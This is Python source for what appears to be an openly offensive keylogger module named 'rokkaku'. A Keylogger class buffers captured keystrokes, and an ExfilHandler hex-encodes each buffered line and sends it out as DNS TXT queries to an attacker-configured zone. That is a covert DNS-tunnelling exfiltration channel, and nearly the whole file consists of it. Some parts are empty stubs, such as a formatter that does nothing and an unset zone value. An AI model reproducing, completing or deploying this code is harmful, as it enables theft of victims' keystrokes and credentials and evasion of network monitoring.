# -*- coding: utf-8 -*-

try:
    import ConfigParser as configparser
except ImportError:
    import configparser
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO

import binascii
import dns.exception
import dns.resolver
import logging.handlers
import sys
import socket

cfg = """
[rokkaku]
dns_zone
"""


def cfg_factory(cfg):
    local_cfg = configparser.ConfigParser(allow_no_value=False)
    try:
        local_cfg.readfp(StringIO(cfg))
    except configparser.ParsingError:
        sys.exit(1)
    if not local_cfg.has_section('rokkaku'):
        sys.exit(1)
    return local_cfg


mal_cfg = cfg_factory(cfg)


class CryptoFormatter(logging.Formatter):

    def format(self, record):
        if record.levelno in (logging.CRITICAL,
                              logging.ERROR,
                              logging.INFO,
                              logging.WARNING):
            pass


class ExfilHandler(logging.handlers.MemoryHandler):

    def __init__(self, **kwargs):
        super(ExfilHandler, self).__init__(**kwargs)

    @property
    def can_exfil(self):
        return True if self.target.stream.getvalue() else False

    def emit(self, record):
        self.buffer.append(record)
        if not self.shouldFlush(record):
            return

        self.flush()

        dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
        if not self.can_exfil:
            return
        exfil_data = self.target.stream.getvalue().splitlines()
        for exfil in exfil_data:
            payload = binascii.hexlify(bytes(exfil, 'utf8'))
            try:
                dns.resolver.query(
                    '{exfil}.{dns_zone}'.format(
                        exfil=payload,
                        dns_zone=dns_zone),
                    rdtype=dns.rdatatype.TXT)
            except dns.exception.DNSException:
                continue
        self.target.stream = StringIO()


class Keylogger(object):

    BUFFER_SIZE = 100
    BASE_FORMAT = '%(asctime)s %(message)s'
    DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        stream_handler = logging.StreamHandler(StringIO())
        formatter = logging.Formatter(
            fmt=self.BASE_FORMAT, datefmt=self.DATE_FORMAT)
        stream_handler.setFormatter(formatter)
        self.exfil_handler = ExfilHandler(
            capacity=self.BUFFER_SIZE, target=stream_handler)
        self.logger.addHandler(self.exfil_handler)

    def log(self, key):
        self.logger.info(key)

    def __del__(self):
        self.logger.removeHandler(self.exfil_handler)
        self.exfil_handler.close()


if __name__ == '__main__':
    pass
